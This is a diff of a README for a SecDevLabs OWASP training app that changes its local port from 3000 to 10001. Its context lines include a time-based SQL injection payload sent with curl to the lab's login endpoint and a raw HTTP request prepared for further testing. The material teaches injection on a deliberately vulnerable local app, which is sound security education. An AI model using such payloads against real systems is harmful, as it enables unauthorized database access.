@@ -31,7 +31,7 @@ cd secDevLabs/owasp-top10-2017-apps/a1/copy-n-paste
 make install
 ```
 
-Then simply visit [localhost:3000][App], as exemplified below:
+Then simply visit [localhost:10001][App], as exemplified below:
 
 <img src="images/CopyNPaste.png" align="center"/>
 
@@ -43,11 +43,11 @@ To properly understand how this application works, you can follow these simple s
 - Login as this user via front-end.
 * Register another user now using command line:
 ```sh
-curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password", "passcheck":"password"}' http://localhost:3000/register
+curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password", "passcheck":"password"}' http://localhost:10001/register
 ```
 * Login as this second user now using command line:
 ```sh
-curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password"}' http://localhost:3000/login
+curl -s -H "Content-Type: application/json" -d '{"user":"bob", "pass":"password"}' http://localhost:10001/login
 
 ```
 
@@ -89,7 +89,7 @@ To confirm the input field is vulnerable, the following payload could be used to
 Using `curl` on CLI interface, we can test it again, this time with a larger 30 seconds delay:
 
 ```sh
-curl -s -H "Content-Type: application/json" -d '{"user":"-1'\'' union select 1,2,sleep(30) -- ", "pass":"password"}' http://127.0.0.1:3000/login
+curl -s -H "Content-Type: application/json" -d '{"user":"-1'\'' union select 1,2,sleep(30) -- ", "pass":"password"}' http://127.0.0.1:10001/login
 ```
 
 Request:
@@ -114,7 +114,7 @@ The first possible step is to create a file, `postRequest.txt`, containing the H
 
 ```sh
 POST /login HTTP/1.1
-Host: 127.0.0.1:3000
+Host: 127.0.0.1:10001
 User-Agent: curl/7.54.0
 Accept: */*
 Content-Type: application/json
@@ -167,4 +167,4 @@ We encourage you to contribute to SecDevLabs! Please check out the [Contributing
 
 [Docker Install]:  https://docs.docker.com/install/
 [Docker Compose Install]: https://docs.docker.com/compose/install/
-[App]: http://localhost:3000
+[App]: http://localhost:10001
